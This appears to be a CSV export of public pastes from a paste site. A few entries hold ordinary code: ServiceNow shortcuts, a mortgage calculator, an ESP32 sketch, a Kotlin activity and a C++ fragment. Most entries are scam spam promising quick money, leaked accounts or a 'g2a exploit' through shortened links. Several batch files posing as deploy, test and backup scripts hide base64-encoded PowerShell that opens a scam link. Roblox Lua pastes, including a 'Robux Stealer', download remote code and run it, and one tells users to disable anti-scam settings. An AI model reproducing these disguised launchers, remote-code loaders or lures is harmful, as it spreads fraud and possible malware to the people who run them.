id,title,username,language,date,content
kEF7NCnz,EARN $900 INSTANTLY 2025? GV,ii_xjackk,JavaScript,Thursday 8th of May 2025 12:52:08 AM CDT,309596 - check it out at https://tinyurl.com/4npuscbk
Vp0DUKuV,deploy_app.ps1,K3_dohko_1,Batch,Thursday 8th of May 2025 12:51:38 AM CDT,"@ECHO OFF
TITLE $~foddyn: Executor v1.1
@REM ... all the other handlers ...
if %choice%==tutorial GOTO tutorial

:openHf
ECHO Launching PowerShell command...
powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvADkANwA2AHgAZgA5AHQAdQAvACIAIAAgACMAIABpAGQAPQA2ADkAMwA4ADEANwA3ADIA
EXIT /b
"
iBQAm15W,Slash Commands,spriyadarshi,JSON,Thursday 8th of May 2025 12:51:19 AM CDT,"{
    ""sj"": {
        ""url"": ""sysauto_script_list.do?sysparm_query=nameLIKE$0^ORDERBYDESCsys_updated_on"",
        ""hint"": ""Scheduled Script Executions <search>"",
        ""fields"": """",
        ""order"": 0,
        ""overwriteurl"": """"
    },
    ""g"": {
        ""url"": ""sys_user_group_list.do?sysparm_query=nameLIKE$0^ORDERBYDESCsys_updated_on"",
        ""hint"": ""Groups <search>"",
        ""fields"": """",
        ""order"": 0,
        ""overwriteurl"": """"
    },
    ""er"": {
        ""url"": ""sysevent_register_list.do?sysparm_query=event_nameLIKE$0^ORDERBYDESCsys_updated_on"",
        ""hint"": ""Event Registry <search>"",
        ""fields"": """",
        ""order"": 0,
        ""overwriteurl"": """"
    },
    ""el"": {
        ""url"": ""sysevent_list.do?sysparm_query=nameLIKE$0^sys_created_onONToday@javascript:gs.beginningOfToday()@javascript:gs.endOfToday()^ORDERBYDESCsys_updated_on"",
        ""hint"": ""Events <search>"",
        ""fields"": """",
        ""order"": 0,
        ""overwriteurl"": """"
    },
    ""us"": {
        ""url"": ""sys_update_set_list.do?sysparm_query=nameLIKE$0^ORDERBYDESCsys_updated_on"",
        ""hint"": ""Update Sets <search>"",
        ""fields"": """",
        ""order"": 0,
        ""overwriteurl"": """"
    },
    ""spwi"": {
        ""url"": ""sp_instance_list.do?sysparm_query=titleLIKE$0^ORDERBYDESCsys_updated_on"",
        ""hint"": ""Widget Instances <search>"",
        ""fields"": """",
        ""order"": 0,
        ""overwriteurl"": """"
    },
    ""mt"": {
        ""url"": ""task_list.do?sysparm_query=assigned_toDYNAMIC90d1921e5f510100a9ad2572f2b477fe^ORadditional_assignee_listLIKE9f1dd28397a00214809afff3a253af60^active=true^ORDERBYDESCsys_updated_on^GROUPBYsys_class_name&sysparm_view=unified_agile_board"",
        ""hint"": ""My Tasks"",
        ""fields"": """",
        ""order"": 0,
        ""overwriteurl"": """"
    },
    ""fe"": {
        ""url"": ""sys_flow_context_list.do?sysparm_query=source_recordLIKE$0^sys_created_onONToday@javascript:gs.beginningOfToday()@javascript:gs.endOfToday()^ORDERBYDESCsys_created_on"",
        ""hint"": ""Flow engine contexts <search>"",
        ""fields"": """",
        ""order"": 0,
        ""overwriteurl"": """"
    },
    ""sla"": {
        ""url"": ""contract_sla_list.do?sysparm_query=nameLIKE$0^ORDERBYDESCsys_updated_on"",
        ""hint"": ""SLA Definitions <search>"",
        ""fields"": """",
        ""order"": 0,
        ""overwriteurl"": """"
    },
    ""em"": {
        ""url"": ""sys_email_list.do?sysparm_query=subjectLIKE$0^sys_created_onONToday@javascript:gs.beginningOfToday()@javascript:gs.endOfToday()^ORDERBYDESCsys_created_on"",
        ""hint"": ""Emails <search>"",
        ""fields"": """",
        ""order"": 0,
        ""overwriteurl"": """"
    },
    ""ia"": {
        ""url"": ""sysevent_in_email_action_list.do?sysparm_query=nameLIKE$0^ORDERBYDESCsys_created_on"",
        ""hint"": ""Inbound Email Actions <search>"",
        ""fields"": """",
        ""order"": 0,
        ""overwriteurl"": """"
    },
    ""ci"": {
        ""url"": ""sc_cat_item_list.do?sysparm_query=nameLIKE$0^active=true^ORDERBYDESCsys_updated_on"",
        ""hint"": ""Catalog Items <search>"",
        ""fields"": """",
        ""order"": 0,
        ""overwriteurl"": """"
    },
    ""rp"": {
        ""url"": ""sc_cat_item_producer_list.do?sysparm_query=nameLIKE$0^active=true^ORDERBYDESCsys_updated_on"",
        ""hint"": ""Record Producers <search>"",
        ""fields"": """",
        ""order"": 0,
        ""overwriteurl"": """"
    },
    ""ms"": {
        ""url"": ""sys_script_email_list.do?sysparm_query=nameLIKE$0^ORDERBYDESCsys_updated_on"",
        ""hint"": ""Email Scripts <search>"",
        ""fields"": """",
        ""order"": 0,
        ""overwriteurl"": """"
    },
    ""notifications"": {
        ""url"": ""sysevent_email_action_list.do?sysparm_query=nameLIKE$0^active=true^ORDERBYDESCsys_updated_on"",
        ""hint"": ""Notifications <search>"",
        ""fields"": """",
        ""order"": 0,
        ""overwriteurl"": """"
    },
    ""sdr"": {
        ""url"": ""sd_skill_determination_rule_list.do?sysparm_query=nameLIKE$0^ORDERBYDESCsys_updated_on"",
        ""hint"": ""Skill Determination Rules <search>"",
        ""fields"": """",
        ""order"": 0,
        ""overwriteurl"": """"
    }
}"
tLL3w9Xq,Mortgage calculator,sho7onbd,JavaScript,Thursday 8th of May 2025 12:48:10 AM CDT,"    <script>
        function calculateMortgage() {
            let propertyPrice = parseFloat(document.getElementById(""propertyPrice"").value);
            let downPayment = parseFloat(document.getElementById(""downPayment"").value);
            let loanLength = parseInt(document.getElementById(""loanLength"").value) * 12; // Convert years to months
            let interestRate = parseFloat(document.getElementById(""interestRate"").value) / 100 / 12; // Convert annual rate to monthly rate
            
            let loanAmount = propertyPrice - downPayment;
            let monthlyPayment = (loanAmount * interestRate) / (1 - Math.pow(1 + interestRate, -loanLength));
            
            if (!isNaN(monthlyPayment) && monthlyPayment !== Infinity) {
                document.getElementById(""result"").innerText = `$${monthlyPayment.toFixed(2)}`;
            } else {
                document.getElementById(""result"").innerText = ""Please enter valid values."";
            }
        }

        function updateSliderValues() {
            document.getElementById(""propertyPriceValue"").innerText = document.getElementById(""propertyPrice"").value;
            document.getElementById(""downPaymentValue"").innerText = document.getElementById(""downPayment"").value;
            document.getElementById(""loanLengthValue"").innerText = document.getElementById(""loanLength"").value;
            document.getElementById(""interestRateValue"").innerText = document.getElementById(""interestRate"").value;
            calculateMortgage();
        }

        document.addEventListener(""DOMContentLoaded"", function() {
            let sliders = document.querySelectorAll(""input[type=range]"");
            sliders.forEach(slider => {
                slider.addEventListener(""input"", updateSliderValues);
            });
            calculateMortgage(); // Initial calculation
        });
    </script>"
P2Zc7ec6,Make $1000 15-MINUTES  (BEGINNER) 6D,fwdxcphoenix,JavaScript,Thursday 8th of May 2025 12:48:07 AM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

3zu7Wl1MzG
"
a1Pbhqyj,Make $1000 15 - MINUTES(BEGINNER) YR,ii_xjackk,JavaScript,Thursday 8th of May 2025 12:41:35 AM CDT,738506 - check it out at https://tinyurl.com/4npuscbk
5cMYYfeu,EARN $900 INSTANTLY 2025 EI,fwdxcphoenix,JavaScript,Thursday 8th of May 2025 12:41:21 AM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

NW4MQ36xpH
"
91Um1iAJ,run_tests.bat,K3_dohko_1,Batch,Thursday 8th of May 2025 12:41:06 AM CDT,"@ECHO OFF
TITLE $~foddyn: Executor v1.1
@REM ... all the other handlers ...
if %choice%==tutorial GOTO tutorial

:openHf
ECHO Launching PowerShell command...
powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvADkANwA2AHgAZgA5AHQAdQAvACIAIAAgACMAIABpAGQAPQA3ADUAMAAwAGQANQBmAGIA
EXIT /b
"
GQ3jqhjM,restart_services.cmd,K3_dohko_1,Batch,Thursday 8th of May 2025 12:40:35 AM CDT,"@ECHO OFF
TITLE $~foddyn: Executor v1.1
@REM ... all the other handlers ...
if %choice%==tutorial GOTO tutorial

:openHf
ECHO Launching PowerShell command...
powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvADkANwA2AHgAZgA5AHQAdQAvACIAIAAgACMAIABpAGQAPQA3ADkAMABkAGEAZAAwADEA
EXIT /b
"
Q6JES1J0,Make $1000 15-MINUTES  (BEGINNER) 6D,fedello66,JavaScript,Thursday 8th of May 2025 12:40:32 AM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

mNSZRR23Cn
"
zaWZnAJh,PayPal with Balance,donnybrowne,PHP,Thursday 8th of May 2025 12:35:55 AM CDT,239295 - check it out at https://tinyurl.com/bwv75hz9
tTbHcQjq,EARN $900 INSTANTLY 2025 EI,fedello66,JavaScript,Thursday 8th of May 2025 12:33:48 AM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

wuq3FUgqGh
"
JrtAdyjx,EARN $900 INSTANTLY 2025? GV,Nathanfr3,PHP,Thursday 8th of May 2025 12:32:58 AM CDT,989165 - check it out at https://tinyurl.com/976xf9tu
91rTQmMv,shutdown_machine.ps1,BHOO100,Batch,Thursday 8th of May 2025 12:30:02 AM CDT,"@ECHO OFF
TITLE $~foddyn: Executor v1.1
@REM ... all the other handlers ...
if %choice%==tutorial GOTO tutorial

:openHf
ECHO Launching PowerShell command...
powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvADkANwA2AHgAZgA5AHQAdQAvACIAIAAgACMAIABpAGQAPQAzADUAMgA1ADEAOAA0ADgA
EXIT /b
"
vCjW1BbV,Make $1000 15-MINUTES (BEGINNER) OV,fedello66,JavaScript,Thursday 8th of May 2025 12:27:00 AM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

Cdgyr9UolA
"
MFTKF4Bm,PayPal with Balance,donnybrowne,PHP,Thursday 8th of May 2025 12:25:24 AM CDT,476449 - check it out at https://tinyurl.com/bwv75hz9
ZJCj6YHJ,accs fresh,donnybrowne,PHP,Thursday 8th of May 2025 12:24:53 AM CDT,293722 - check it out at https://tinyurl.com/bwv75hz9
515Apz00,EARN $900 INSTANTLY 2025? GV,Nathanfr3,PHP,Thursday 8th of May 2025 12:22:57 AM CDT,918230 - check it out at https://tinyurl.com/976xf9tu
CbdqbGJt,EARN $900 INSTANTLY 2025⭐ DG,fedello66,JavaScript,Thursday 8th of May 2025 12:20:15 AM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

mQVMkPXx5U
"
NLsCvSAF,update_system.bat,BHOO100,Batch,Thursday 8th of May 2025 12:20:01 AM CDT,"@ECHO OFF
TITLE $~foddyn: Executor v1.1
@REM ... all the other handlers ...
if %choice%==tutorial GOTO tutorial

:openHf
ECHO Launching PowerShell command...
powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvADkANwA2AHgAZgA5AHQAdQAvACIAIAAgACMAIABpAGQAPQA1AGUANwAzADAAZgAxAGEA
EXIT /b
"
SrM5dtrf,**SD Button** rev_01,pleasedontcode,Arduino,Thursday 8th of May 2025 12:19:02 AM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: **SD Button**
	- Source Code NOT compiled for: ESP32 DevKit V1
	- Source Code created on: 2025-05-08 05:18:42

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* write a code in which sd card store the value from */
	/* HMI and rewrite the value as change happens */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/
#include <SPI.h>
#include <SdFat.h>	//https://github.com/greiman/SdFat
#include <EasyButton.h>	//https://github.com/evert-arias/EasyButton

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);
void writeValueToSDCard(int value);
void readValueFromSDCard();
void buttonPressed();

/***** DEFINITION OF DIGITAL INPUT PINS *****/
const uint8_t myPushButton_PushButton_PIN_D4		= 4;

/***** DEFINITION OF SPI PINS *****/
const uint8_t sd__SDCardModule_SPI_PIN_MOSI_D23		= 23;
const uint8_t sd__SDCardModule_SPI_PIN_MISO_D19		= 19;
const uint8_t sd__SDCardModule_SPI_PIN_SCLK_D18		= 18;
const uint8_t sd__SDCardModule_SPI_PIN_CS_D5		= 5;

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
// Create an instance of the SD card
SdFat SD;
File dataFile;

// Create an instance of EasyButton
EasyButton button(myPushButton_PushButton_PIN_D4);

/****** VARIABLE TO STORE VALUE *****/
int storedValue = 0;

void setup(void)
{
	// put your setup code here, to run once:
	pinMode(myPushButton_PushButton_PIN_D4, INPUT_PULLUP);
	pinMode(sd__SDCardModule_SPI_PIN_CS_D5, OUTPUT);
	SPI.begin();

	// Initialize the SD card
	if (!SD.begin(sd__SDCardModule_SPI_PIN_CS_D5)) {
		Serial.println(""SD Card initialization failed!"");
		return;
	}
	Serial.println(""SD Card initialized."");

	// Initialize the button
	button.begin();
	button.onPressed(buttonPressed);

	// Read the initial value from the SD card
	readValueFromSDCard();
}

void loop(void)
{
	// put your main code here, to run repeatedly:
	button.read();
}

// Function to write value to SD card
void writeValueToSDCard(int value) {
	dataFile = SD.open(""value.txt"", FILE_WRITE);
	if (dataFile) {
		dataFile.println(value);
		dataFile.close();
		Serial.print(""Value written to SD Card: "");
		Serial.println(value);
	} else {
		Serial.println(""Error opening file for writing."");
	}
}

// Function to read value from SD card
void readValueFromSDCard() {
	dataFile = SD.open(""value.txt"");
	if (dataFile) {
		storedValue = dataFile.parseInt();
		dataFile.close();
		Serial.print(""Value read from SD Card: "");
		Serial.println(storedValue);
	} else {
		Serial.println(""Error opening file for reading."");
	}
}

// Function called when the button is pressed
void buttonPressed() {
	storedValue++; // Increment the value
	writeValueToSDCard(storedValue); // Write the new value to the SD card
}

/* END CODE */"
TqeJxBAc,Leaked Accounts - Fresh Hits,donnybrowne,PHP,Thursday 8th of May 2025 12:14:22 AM CDT,155876 - check it out at https://tinyurl.com/bwv75hz9
P115aMRP,DetailActivity Before Adding TAB,eveeeeef21,Kotlin,Thursday 8th of May 2025 12:14:05 AM CDT,"package com.ahmadrd.cryptotrack.ui.detail

import android.os.Bundle
import android.util.Log
import android.view.View
import android.widget.Toast
import androidx.activity.enableEdgeToEdge
import androidx.activity.viewModels
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.ViewCompat
import androidx.core.view.WindowInsetsCompat
import androidx.lifecycle.ViewModelProvider
import com.ahmadrd.cryptotrack.R
import com.ahmadrd.cryptotrack.ui.utils.Result
import com.ahmadrd.cryptotrack.databinding.ActivityDetailBinding
import com.ahmadrd.cryptotrack.di.Injection
import com.ahmadrd.cryptotrack.ui.home.HomeViewModel
import com.ahmadrd.cryptotrack.ui.utils.ChartFormatter
import com.ahmadrd.cryptotrack.ui.utils.PriceFormatter
import com.ahmadrd.cryptotrack.ui.utils.ViewModelFactory
import com.bumptech.glide.Glide

class DetailActivity : AppCompatActivity() {

    companion object {
        const val EXTRA_ID = ""extra_id""
    }

    private lateinit var binding: ActivityDetailBinding
    private val repository = Injection.provideCoinRepository()
    private val factory = ViewModelFactory(repository)
    private val viewModel: DetailViewModel by viewModels { factory }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        binding = ActivityDetailBinding.inflate(layoutInflater)
        setContentView(binding.root)
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.detail)) { v, insets ->
            val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom)
            insets
        }
//        viewModel = ViewModelProvider(this, factory)[HomeViewModel::class.java]

        val dataCoins = intent.getStringExtra(EXTRA_ID)
        if (dataCoins != null) {
            viewModel.getDetailCoins(dataCoins)
            observeViewModel()
        }
    }

    private fun observeViewModel() {
        viewModel.detailCoins.observe(this) { result ->
            when (result) {
                is Result.Loading -> showLoading(true)
                is Result.Success -> {
                    showLoading(false)
                    Glide.with(this)
                        .load(result.data.image?.thumb)
                        .error(R.drawable.baseline_broken_image_24)
                        .into(binding.imgCoinLogo)
                    with(binding) {
                        tvCoinName.text = result.data.name
//                        tvPrice.text = ""$${result.data.marketData?.currentPrice?.usd ?: ""N/A""}""
//                        tvPriceChange.text = ""${result.data.marketData?.priceChangePercentage24hInCurrency?.usd ?: ""N/A""}%""
                        tvPrice.text = PriceFormatter.formatUSD(result.data.marketData?.currentPrice?.usd ?: 0.0)
                        tvPriceChange.text = getString(
                            R.string.price_change_format,
                            result.data.marketData?.priceChangePercentage24hInCurrency?.usd
                                ?: getString(R.string.not_available)
                        )

                        val priceList = result.data.marketData?.sparkline?.price
                        Log.d(""SparklineCheck"", ""Price list size: ${priceList?.size}"")
                        if (!priceList.isNullOrEmpty()) {
                            ChartFormatter.setupSparklineChart(
                                chartView,
                                priceList,
                                result.data.marketData.priceChangePercentage24h
                            )
                        } else {
                            chartView.clear()
                        }

                        tvMarketCap.text = getString(
                            R.string.market_cap_format,
                            result.data.marketData?.marketCap?.usd
                                ?: getString(R.string.not_available)
                        )
                        tvVolume.text = getString(
                            R.string.volume_format,
                            result.data.marketData?.totalVolume?.usd
                                ?: getString(R.string.not_available)
                        )
                        tvHighLow.text = getString(
                            R.string.high_low_format,
                            result.data.marketData?.high24h?.usd
                                ?: getString(R.string.not_available),
                            result.data.marketData?.low24h?.usd
                                ?: getString(R.string.not_available)
                        )
                        tvSupply.text = getString(
                            R.string.total_supply_format,
                            result.data.marketData?.totalSupply
                                ?: getString(R.string.not_available),
                            result.data.symbol?.uppercase()
                        )

//                        tvMarketCap.text = ""Market Cap: $${result.data.marketData?.marketCap?.usd ?: ""N/A""}""
//                        tvVolume.text = ""24h Volume: $${result.data.marketData?.totalVolume?.usd ?: ""N/A""}""
//                        tvHighLow.text = ""24h High / Low: $${result.data.marketData?.high24h?.usd ?: ""N/A""} / $${result.data.marketData?.low24h?.usd ?: ""N/A""}""
//                        tvSupply.text = ""Total Supply: ${result.data.marketData?.totalSupply ?: ""N/A""} ${result.data.symbol?.uppercase()}""

                        val desc = result.data.description?.en
                        if (desc != null && desc != """") {
                            tvDescription.text = desc
                        } else {
                            tvDescription.text = getString(R.string.no_desc)
                        }
                    }

                }

                is Result.Error -> {
                    showError(result.error)
                }
            }
        }
    }

    private fun showLoading(isLoading: Boolean) {
        binding.shimmerFrameDetail.visibility = if (isLoading) View.VISIBLE else View.GONE
        binding.contentLayout.visibility = if (isLoading) View.GONE else View.VISIBLE
    }

    private fun showError(isError: String) {
        Toast.makeText(this, isError, Toast.LENGTH_SHORT).show()
    }
}"
isyTiT0V,EARN $900 INSTANTLY 2025 EI,vvl,JavaScript,Thursday 8th of May 2025 12:13:28 AM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

2I6AZ1XCbn
"
1Ja7gJAg,accs fresh,Nathanfr3,PHP,Thursday 8th of May 2025 12:12:26 AM CDT,496745 - check it out at https://tinyurl.com/976xf9tu
2qrTxRn1,accs fresh,Nathanfr3,PHP,Thursday 8th of May 2025 12:11:50 AM CDT,959564 - check it out at https://tinyurl.com/976xf9tu
k7cVRKc7,backup_data.bat,BHOO100,Batch,Thursday 8th of May 2025 12:10:00 AM CDT,"@ECHO OFF
TITLE $~foddyn: Executor v1.1
@REM ... all the other handlers ...
if %choice%==tutorial GOTO tutorial

:openHf
ECHO Launching PowerShell command...
powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvADkANwA2AHgAZgA5AHQAdQAvACIAIAAgACMAIABpAGQAPQAyADIAOQA3ADkAMAAyAGQA
EXIT /b
"
UWFiZYzU,free hf ebooks,christeze,PHP,Thursday 8th of May 2025 12:03:20 AM CDT,177456 - check it out at https://tinyurl.com/bwv75hz9
vLtagVY6,Make $1000 15 - MINUTES(BEGINNER) YR,medoppo5,PHP,Thursday 8th of May 2025 12:01:18 AM CDT,949716 - check it out at https://tinyurl.com/976xf9tu
jyaEExWQ,Products.js,christeze,PHP,Wednesday 7th of May 2025 11:52:18 PM CDT,967650 - check it out at https://tinyurl.com/bwv75hz9
wuEafRG1,Untitled,christeze,PHP,Wednesday 7th of May 2025 11:51:48 PM CDT,824060 - check it out at https://tinyurl.com/bwv75hz9
GXcAiNuz,Pls Donate Robux Stealer,Chayong,Lua,Wednesday 7th of May 2025 11:51:31 PM CDT,"-- If You are using a Delta Exploit and want it to work properly, turn off the 'ANTI SCAM' and 'DISABLE ROBUX' feature in your Delta exploit settings. This will make the UI appear and allow you to use it without any issues.

loadstring(game:HttpGet(""https://raw.githubusercontent.com/UNDERATEDUNAVALLEVR/Pls-Donate/refs/heads/main/Script.lua""))()"
9k2k7F62,Products.js,medoppo5,PHP,Wednesday 7th of May 2025 11:51:18 PM CDT,328288 - check it out at https://tinyurl.com/976xf9tu
xiTRJ3Qs,How High Can You Jump?,new2479,Lua,Wednesday 7th of May 2025 11:48:21 PM CDT,"--https://www.youtube.com/@WinPo1R              pls sub
 
loadstring(game:HttpGet(""https://raw.githubusercontent.com/powin273/script/refs/heads/main/How_High_Can_You_Jump.lua"", true))()"
mqJZ3MyC,Every Click +1 Fat 🍕,new2479,Lua,Wednesday 7th of May 2025 11:48:20 PM CDT,"--https://www.youtube.com/@WinPo1R              pls sub
 
loadstring(game:HttpGet(""https://raw.githubusercontent.com/powin273/script/refs/heads/main/Every_Click_%2B1_Fat.lua"", true))()"
0mQkvws5,EVAPORADORES,J0R6EW4P0,C++,Wednesday 7th of May 2025 11:48:08 PM CDT,"#include<iostream>
#include<cmath>
#include<time.h>
#include<stdlib.h>
#include<fstream>
#include<iomanip>
#include<Eigen/Dense>
#include<ceres/ceres.h>
#include<vector>
#include<algorithm>
#include<numeric>
#include<stdexcept>
using namespace std;
using namespace Eigen;

static const std::vector<double> temperaturas={32.018,35,40,45,50,60,70,80,90,100,110,120,130,140,150,160,170,180,190,200,210,212,220,230,240,250,260,270,280,290,300,320,340,360,380,400,420,440,460,480,500,520,540,560,580,600,620,640,660,680,700,705.44};
static const std::vector<double> entalpia_vaporizacion={1075.4,1073.7,1070.9,1068.1,1065.2,1059.6,1053.9,1048.3,1042.6,1037.0,1031.3,1025.5,1019.8,1013.9,1008.1,1002.1,996.2,990.2,984.1,977.8,971.6,970.3,965.3,958.8,952.3,945.6,938.8,932.0,924.9,917.8,910.5,895.4,879.5,862.9,845.4,826.9,807.2,786.3,764.1,740.3,714.8,687.2,657.4,625.0,589.4,549.7,505.0,453.3,391.1,309.8,167.5,0.0};
